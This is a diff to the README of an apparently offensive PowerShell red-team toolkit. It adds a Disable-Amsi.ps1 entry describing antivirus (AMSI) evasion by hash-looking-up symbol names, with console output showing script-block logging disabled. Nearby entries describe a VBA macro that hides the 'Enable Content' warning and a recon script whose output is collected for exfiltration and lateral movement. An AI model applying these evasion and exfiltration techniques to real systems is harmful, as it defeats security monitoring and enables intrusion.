@@ -18,6 +18,28 @@ IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Com
 
 - **`delete-warning-div-macro.vbs`** - VBA Macro function to be used as a Social Engineering trick removing "Enable Content" warning message as the topmost floating text box with given name. ([gist](https://gist.github.com/mgeeky/9cb6acdec31c8a70cc037c84c77a359c))
 
+- **`Disable-Amsi.ps1`** - Tries to evade AMSI by leveraging couple of publicly documented techniqus, but in an approach to avoid signatured or otherwise considered harmful keywords. 
+
+Using a hash-lookup approach when determining prohibited symbol names, we are able to avoid relying on blacklisted values and having them hardcoded within the script. This implementation iterates over all of the assemblies, their exposed types, methods and fields in order to find those that are required but by their computed hash-value rather than direct name. Since hash-value computation algorithm was open-sources and is simple to manipulate, the attacker becomes able to customize hash-lookup scheme the way he likes.
+
+```
+PS > "amsiInitFailed"
+At line:1 char:1
++ "amsiInitFailed"
++ ~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+PS > . .\Disable-Amsi.ps1
+PS > Disable-Amsi
+[+] Disabled Script Block logging.
+[+] Success via technique 1.
+PS > "amsiInitFailed"
+amsiInitFailed
+```
+
+
 - **`Export-ReconData.ps1`** - Powershell script leveraging [PowerSploit Recon](https://github.com/PowerShellMafia/PowerSploit) module (PowerView) to save output from Reconnaissance cmdlets like `Get-*`, `Find-*` into _Clixml_ files. Those files (stored in an output directory as separate XML files) can later be extracted from attacked environment and loaded to a new powershell runspace using the same script. Very useful when we want to obtain as many data as possible, then exfiltrate that data, review it in our safe place and then get back to attacked domain for lateral spread. **Warning**: Be careful though, as this script launches many reconnaissance commands one by one, this WILL generate a lot of noise. Microsoft ATA for instance for sure pick you up with _"Reconnaissance using SMB session enumeration"_ after you've launched `Invoke-UserHunter`. 
 
     **WARNING:** This script is compatible with newer version of PowerView (coming from dev branch as of 2018),
